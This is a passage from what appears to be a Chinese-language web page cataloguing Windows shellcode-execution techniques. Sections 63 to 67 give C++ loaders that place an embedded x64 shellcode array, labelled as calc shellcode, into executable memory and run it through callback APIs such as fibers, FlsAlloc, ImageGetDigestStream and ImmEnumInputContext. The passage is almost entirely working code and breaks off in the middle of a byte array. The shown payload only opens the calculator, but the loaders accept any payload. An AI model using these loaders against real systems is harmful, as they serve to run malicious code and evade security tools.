class="hljs-comment">//void*&nbsp;pTebFlags&nbsp;=&nbsp;(void*)((uintptr_t)teb&nbsp;+&nbsp;0x17ee);</span><br><span class="linenum hljs-number"> 67</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//char&nbsp;tebFlags&nbsp;=&nbsp;*(char*)pTebFlags;&nbsp;//&nbsp;it's&nbsp;actually&nbsp;a&nbsp;WORD&nbsp;but&nbsp;I&nbsp;don't&nbsp;care&nbsp;about&nbsp;the&nbsp;second&nbsp;byte</span><br><span class="linenum hljs-number"> 68</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//</span><br><span class="linenum hljs-number"> 69</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//BOOL&nbsp;hasFibData&nbsp;=&nbsp;(tebFlags&nbsp;&gt;&gt;&nbsp;2)&nbsp;&amp;&nbsp;0b1;&nbsp;//&nbsp;False&nbsp;here,&nbsp;as&nbsp;the&nbsp;current&nbsp;thread&nbsp;is&nbsp;not&nbsp;yet&nbsp;a&nbsp;fiber</span><br><span class="linenum hljs-number"> 70</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//</span><br><span class="linenum hljs-number"> 71</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//printf("TebFlag&nbsp;=&gt;&nbsp;0x%x\n",&nbsp;tebFlags);</span><br><span class="linenum hljs-number"> 72</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//printf("Has&nbsp;Fiber&nbsp;Data&nbsp;:&nbsp;%s\n",&nbsp;(hasFibData&nbsp;?&nbsp;"true"&nbsp;:&nbsp;"false"));</span><br><span class="linenum hljs-number"> 73</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//printf("Fiber&nbsp;Data&nbsp;Ptr:&nbsp;%p\n",&nbsp;tib-&gt;FiberData);</span><br><span class="linenum hljs-number"> 74</span><br><span class="linenum hljs-number"> 75</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c#L256</span><br><span class="linenum hljs-number"> 76</span>&nbsp;&nbsp;&nbsp;&nbsp;ConvertThreadToFiber(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number"> 77</span><br><span class="linenum hljs-number"> 78</span><br><span class="linenum hljs-number"> 79</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//tebFlags&nbsp;=&nbsp;*(char*)pTebFlags;</span><br><span class="linenum hljs-number"> 80</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//hasFibData&nbsp;=&nbsp;(tebFlags&nbsp;&gt;&gt;&nbsp;2)&nbsp;&amp;&nbsp;0b1;&nbsp;//&nbsp;True&nbsp;here&nbsp;after&nbsp;call&nbsp;to&nbsp;ConvertThreadToFiber</span><br><span class="linenum hljs-number"> 81</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//</span><br><span class="linenum hljs-number"> 82</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//printf("TebFlag&nbsp;=&gt;&nbsp;0x%x\n",&nbsp;tebFlags);</span><br><span class="linenum hljs-number"> 83</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//printf("Has&nbsp;Fiber&nbsp;Data&nbsp;:&nbsp;%s\n",&nbsp;(hasFibData&nbsp;?&nbsp;"true"&nbsp;:&nbsp;"false"));</span><br><span class="linenum hljs-number"> 84</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//printf("Fiber&nbsp;Data&nbsp;Ptr:&nbsp;%p\n",&nbsp;tib-&gt;FiberData);</span><br><span class="linenum hljs-number"> 85</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//</span><br><span class="linenum hljs-number"> 86</span><br><span class="linenum hljs-number"> 87</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">/*<br><span class="linenum hljs-number"> 88</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Important&nbsp;to&nbsp;note&nbsp;that&nbsp;tib-&gt;FiberData&nbsp;==&nbsp;__readgsqword(0x20)<br><span class="linenum hljs-number"> 89</span>&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br><span class="linenum hljs-number"> 90</span><br><span class="linenum hljs-number"> 91</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;lpFiber&nbsp;=&nbsp;CreateFiber(<span class="hljs-number">0x100</span>,&nbsp;(LPFIBER_START_ROUTINE)dummy,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number"> 92</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number"> 93</span>&nbsp;&nbsp;&nbsp;&nbsp;RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number"> 94</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(lpFiber&nbsp;==&nbsp;<span class="hljs-literal">NULL</span>)&nbsp;{<br><span class="linenum hljs-number"> 95</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"GLE&nbsp;:&nbsp;%d"</span>,&nbsp;GetLastError());<br><span class="linenum hljs-number"> 96</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="linenum hljs-number"> 97</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 98</span><br><span class="linenum hljs-number"> 99</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">/*<br><span class="linenum hljs-number">100</span><br><span class="linenum hljs-number">101</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Here&nbsp;we&nbsp;are&nbsp;changing&nbsp;the&nbsp;Fiber&nbsp;Context&nbsp;such&nbsp;that&nbsp;the&nbsp;Created&nbsp;Fiber's&nbsp;entry&nbsp;point<br><span class="linenum hljs-number">102</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(lpFiber&nbsp;+&nbsp;0xb0)<br><span class="linenum hljs-number">103</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Now&nbsp;points&nbsp;to&nbsp;the&nbsp;newly&nbsp;allocated&nbsp;Shellcode.<br><span class="linenum hljs-number">104</span><br><span class="linenum hljs-number">105</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;fiber&nbsp;context&nbsp;resides&nbsp;at&nbsp;the&nbsp;created&nbsp;buffer&nbsp;returned&nbsp;by&nbsp;CreateFiber<br><span class="linenum hljs-number">106</span><br><span class="linenum hljs-number">107</span>&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br><span class="linenum hljs-number">108</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uintptr_t</span>*&nbsp;tgtFuncAddr&nbsp;=&nbsp;(<span class="hljs-keyword">uintptr_t</span>*)((<span class="hljs-keyword">uintptr_t</span>)lpFiber&nbsp;+&nbsp;<span class="hljs-number">0xB0</span>);<br><span class="linenum hljs-number">109</span>&nbsp;&nbsp;&nbsp;&nbsp;*tgtFuncAddr&nbsp;=&nbsp;(<span class="hljs-keyword">uintptr_t</span>)addr;<br><span class="linenum hljs-number">110</span><br><span class="linenum hljs-number">111</span>&nbsp;&nbsp;&nbsp;&nbsp;SwitchToFiber(lpFiber);<br><span class="linenum hljs-number">112</span>}<br></code></pre>
<h1 id="h64flsalloc"><span>64.回调函数注入 通过 FlsAlloc</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hProcess&nbsp;=&nbsp;::GetCurrentProcess();<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;dIndex&nbsp;=&nbsp;::FlsAlloc((PFLS_CALLBACK_FUNCTION)address);<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;CONST&nbsp;CHAR*&nbsp;dummy&nbsp;=&nbsp;<span class="hljs-string">"dummy"</span>;<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;FlsSetValue(dIndex,&nbsp;&amp;dummy);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>}<br></code></pre>
<h1 id="h65imagegetdigeststream"><span>65.回调函数注入 通过 ImageGetDigestStream</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;imagehlp.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;Requires&nbsp;Imagehlp.lib</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hImg&nbsp;=&nbsp;::CreateFileW(<span class="hljs-string">L"C:\\Windows\\System32\\ntdll.dll"</span>,&nbsp;GENERIC_READ,&nbsp;FILE_SHARE_READ,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;dummy;<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hImg)&nbsp;{<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::ImageGetDigestStream(hImg,&nbsp;CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO,&nbsp;(DIGEST_FUNCTION)addr,&nbsp;&amp;dummy);<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::CloseHandle(dummy);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;::CloseHandle(hImg);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>}<br></code></pre>
<h1 id="h66immenuminputcontext"><span>66.回调函数注入 通过 ImmEnumInputContext</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;imm.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Imm32.lib"</span>)</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;::ImmEnumInputContext(<span class="hljs-literal">NULL</span>,&nbsp;(IMCENUMPROC)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>}<br></code></pre>
<h1 id="h67initonceexecuteonce"><span>67.回调函数注入 通过 InitOnceExecuteOnce</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span 